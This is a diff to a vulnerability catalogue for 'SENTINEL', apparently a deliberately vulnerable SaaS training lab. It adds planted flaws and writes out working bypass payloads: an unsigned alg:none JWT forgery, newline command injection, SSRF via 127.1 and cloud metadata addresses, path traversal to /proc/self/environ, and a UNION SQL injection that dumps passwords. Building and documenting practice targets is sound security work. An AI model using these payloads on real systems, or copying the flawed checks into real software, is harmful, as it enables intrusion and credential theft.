@@ -31,7 +31,7 @@ SENTINEL is a multi-tier SaaS subscription platform with three user-facing roles
 
 | Actor | Trust Level | Description |
 |-------|------------|-------------|
-| Anonymous | None | Unauthenticated visitor. Can access all product/pricing pages and all "hidden" API routes |
+| Anonymous | None | Unauthenticated visitor. Can access product/pricing pages. Exploit routes now require JWT. |
 | Free / Pro User | Low | Authenticated. Can purchase tools, create scans, use ARIA chat |
 | Enterprise User | Medium | Can upload RAG documents to the Knowledge Base |
 | Admin | High (claimed) | Can view admin stats — bypassed via header |
@@ -318,10 +318,50 @@ Step 3: Execute targeted exploit against reachable route
 | 44 | `DELETE /api/workspaces/:id/members/:memberId` | Broken AuthZ | Medium | Any member can remove any other member |
 | 45 | `GET /api/workspaces/:id/scans` | Cross-Tenant Data Bleed | High | Returns ALL members' scans; Viewer can read Admin results |
 | 46 | `GET /api/workspaces/:id/invitations` | IDOR + Token Exposure | High | Tokens returned in plaintext — harvest and replay |
+| 47 | `POST /api/auth/login` | JWT Algorithm Confusion | Critical | Returns HS256 JWT; server accepts `alg:none` — forge any role/plan |
+| 48 | `POST /api/ping` | Input Validation Bypass | High | Blocks `;|&\`$<>"'` but MISSES `\n` — newline injection runs arbitrary commands |
+| 49 | `POST /api/fetch` | SSRF Blocklist Bypass | High | Blocks `localhost`, `127.0.0.1`, `::1` — misses `0.0.0.0`, `127.1`, decimal IP, AWS metadata |
+| 50 | `GET /api/files` | Path Traversal Bypass | High | `startsWith("logs/")` prefix check — `logs/../../../../etc/passwd` reads any file |
+| 51 | `POST /api/search` | SQL Injection Bypass | High | Escapes `'` → `''` but misses `"` and UNION injection — dumps all user credentials |
+| 52 | Various tool routes | JWT Auth (all sensitive routes) | Info | All CVE/RCE routes now require JWT — but any `alg:none` forged token is accepted |
 
 ---
 
-### 8. Vulnerable Dependency Versions
+### 8. Vulnerability Complexity Layer (NEW)
+
+All CVE/injection routes now require a valid JWT `Authorization: Bearer <token>` header.
+This adds realistic friction — but the authentication itself is exploitable via JWT Algorithm Confusion.
+
+**Three-step exploit pattern for any gated route:**
+```
+Step 1: Login (or use default creds) to obtain a legitimate JWT
+        POST /api/auth/login { "username": "jdoe", "password": "password1" }
+        → { "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...." }
+
+Step 2: Decode the JWT to inspect claims — or forge a privileged token
+        # Forge admin token with no signature (alg:none bypass):
+        HEADER  = base64url('{"alg":"none","typ":"JWT"}')
+        PAYLOAD = base64url('{"userId":1,"username":"admin","role":"admin","plan":"enterprise"}')
+        FORGED  = HEADER + "." + PAYLOAD + "."  ← empty signature
+
+Step 3: Use real or forged token to access any protected route
+        curl -H "Authorization: Bearer <forged_token>" /api/admin/modules
+        → 200 OK — full module inventory (211 packages, vm2/pug/node-serialize visible)
+        curl -H "Authorization: Bearer <forged_token>" /api/debug
+        → OPENAI_API_KEY, SESSION_SECRET, DATABASE_URL returned in plaintext
+```
+
+**Input validation bypasses added (routes require auth first):**
+| Route | "Security" Check | Bypass |
+|-------|-----------------|--------|
+| `POST /api/ping` | Blocks `;`,`\|`,`&`,`` ` ``,`$`,`<`,`>` | `\n` newline separates commands: `{"host":"8.8.8.8\nid"}` |
+| `POST /api/fetch` | Blocks `localhost`, `127.0.0.1`, `::1` | `http://0.0.0.0:5000/`, `http://127.1/`, `http://169.254.169.254/` |
+| `GET /api/files` | Requires `startsWith("logs/")` | `?filename=logs/../../../../proc/self/environ` reads all env secrets |
+| `POST /api/search` | Escapes `'` → `''` | `{"filters":{"username":"\" UNION SELECT username,password... FROM users--"}}` |
+
+---
+
+### 9. Vulnerable Dependency Versions
 
 | Package | Version | CVE | Attack Class | Reachable Route |
 |---------|---------|-----|-------------|-----------------|
